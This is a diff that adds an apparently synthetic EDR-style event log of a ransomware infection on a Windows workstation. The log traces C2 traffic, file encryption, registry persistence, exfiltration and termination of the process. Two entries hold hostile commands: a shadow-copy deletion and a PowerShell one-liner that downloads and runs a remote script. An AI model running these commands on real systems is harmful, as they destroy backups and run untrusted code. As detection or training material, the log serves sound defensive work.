@@ -1,0 +1,26 @@
+2024-03-24 19:15:00 [SYSTEM] Process started: suspicious_update.exe | PID: 4567 | Parent: outlook.exe | User: john.doe | Path: C:\Users\john.doe\AppData\Local\Temp\suspicious_update.exe
+2024-03-24 19:15:02 [NETWORK] Outbound connection established | Process: suspicious_update.exe | Destination: 45.142.120.88:443 | Protocol: HTTPS | Flag: Unknown_domain
+2024-03-24 19:15:05 [NETWORK] DNS query | Process: suspicious_update.exe | Query: c2-server-789.onion.to | Response: 45.142.120.88 | Flag: Suspicious_TLD
+2024-03-24 19:15:10 [FILE] File enumeration started | Process: suspicious_update.exe | Target: C:\Users\john.doe\Documents\*.docx | Count: 1247 files | Flag: Mass_file_access
+2024-03-24 19:15:15 [FILE] File enumeration started | Process: suspicious_update.exe | Target: C:\Users\john.doe\Pictures\*.jpg | Count: 3456 files | Flag: Mass_file_access
+2024-03-24 19:15:20 [FILE] File encrypted | Original: C:\Users\john.doe\Documents\quarterly_report.docx | New: C:\Users\john.doe\Documents\quarterly_report.docx.locked | Process: suspicious_update.exe
+2024-03-24 19:15:21 [FILE] File encrypted | Original: C:\Users\john.doe\Documents\budget_2024.xlsx | New: C:\Users\john.doe\Documents\budget_2024.xlsx.locked | Process: suspicious_update.exe
+2024-03-24 19:15:22 [FILE] File encrypted | Original: C:\Users\john.doe\Documents\passwords.txt | New: C:\Users\john.doe\Documents\passwords.txt.locked | Process: suspicious_update.exe
+2024-03-24 19:15:23 [CRITICAL] Rapid file modification detected | Process: suspicious_update.exe | Files_modified: 50 | Time_window_seconds: 3 | Pattern: Encryption_activity
+2024-03-24 19:15:25 [FILE] New file created | Path: C:\Users\john.doe\Desktop\README_RANSOM.txt | Process: suspicious_update.exe | Size: 2KB
+2024-03-24 19:15:30 [REGISTRY] Registry key modified | Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run | Value: Persistence | Data: C:\Users\john.doe\AppData\Local\Temp\suspicious_update.exe | Process: suspicious_update.exe
+2024-03-24 19:15:35 [NETWORK] Data exfiltration suspected | Process: suspicious_update.exe | Destination: 45.142.120.88:443 | Upload_size_MB: 150 | Duration_seconds: 30
+2024-03-24 19:15:40 [FILE] Shadow copy deletion attempt | Command: vssadmin delete shadows /all /quiet | Process: suspicious_update.exe | Status: BLOCKED_BY_AV
+2024-03-24 19:15:45 [FILE] Backup deletion attempt | Target: C:\Backups\* | Process: suspicious_update.exe | Files_deleted: 15 | Status: Partial_success
+2024-03-24 19:16:00 [PROCESS] Child process spawned | Parent: suspicious_update.exe | Child: powershell.exe | Command: "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
+2024-03-24 19:16:05 [NETWORK] C2 beacon detected | Process: suspicious_update.exe | Destination: 45.142.120.88:443 | Frequency: Every_60_seconds | Pattern: C2_communication
+2024-03-24 19:16:10 [MEMORY] Code injection detected | Source: suspicious_update.exe | Target: explorer.exe | Technique: Process_hollowing
+2024-03-24 19:16:15 [CRITICAL] Ransomware confirmed | Strain: LockBit_3.0 | Encrypted_files: 500 | Ransom_amount: 5_BTC | Contact: Email in README_RANSOM.txt
+2024-03-24 19:16:20 [NETWORK] Bitcoin transaction detected | Process: suspicious_update.exe | Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa | Amount: 0 BTC | Status: Payment_request
+2024-03-24 19:16:25 [FILE] Wallpaper changed | New_image: C:\Users\john.doe\AppData\Local\Temp\ransom_note.jpg | Process: suspicious_update.exe
+2024-03-24 19:16:30 [SYSTEM] Process persistence confirmed | Autostart_entry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater | Binary: suspicious_update.exe | Status: Active
+2024-03-24 19:16:35 [NETWORK] TOR connection established | Process: suspicious_update.exe | Bridge: 103.251.167.200:9001 | Flag: Anonymization_tool
+2024-03-24 19:17:00 [FILE] File encryption continuing | Files_encrypted_total: 1247 | Target_extensions: .docx, .xlsx, .pdf, .jpg, .png, .zip, .db | Process: suspicious_update.exe
+2024-03-24 19:17:30 [ALERT] EDR Alert triggered | Severity: CRITICAL | Detection: Ransomware_behavior | Process: suspicious_update.exe | Action: Process_terminated | Status: SUCCESS
+2024-03-24 19:17:35 [FORENSIC] Memory dump created | Process: suspicious_update.exe | Dump_path: C:\ProgramData\EDR\dumps\suspicious_update_4567.dmp | Size_MB: 45
+2024-03-24 19:17:40 [NETWORK] C2 connection blocked | Destination: 45.142.120.88:443 | Rule: IOC_blocklist | Status: Connection_refused
